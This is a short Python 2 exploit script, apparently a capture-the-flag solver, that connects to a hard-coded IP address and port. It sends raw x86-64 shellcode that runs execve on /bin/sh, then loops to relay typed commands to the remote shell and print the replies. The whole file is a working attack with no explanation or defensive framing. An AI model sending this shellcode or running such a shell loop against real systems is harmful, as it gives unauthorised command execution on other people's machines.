import socket
import time
#0x4012AC

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('222.182.106.193',55555))
raw_input("debug")
buf = "\x55\x48\x89\xe5\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xd2\x48\x31\xf6\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05"

print s.recv(1024)
s.send(buf)
time.sleep(5)
print s.recv(1024)

while True:
    s.send(raw_input('$ ') + '\n')
    time.sleep(1)
    print s.recv(1024)
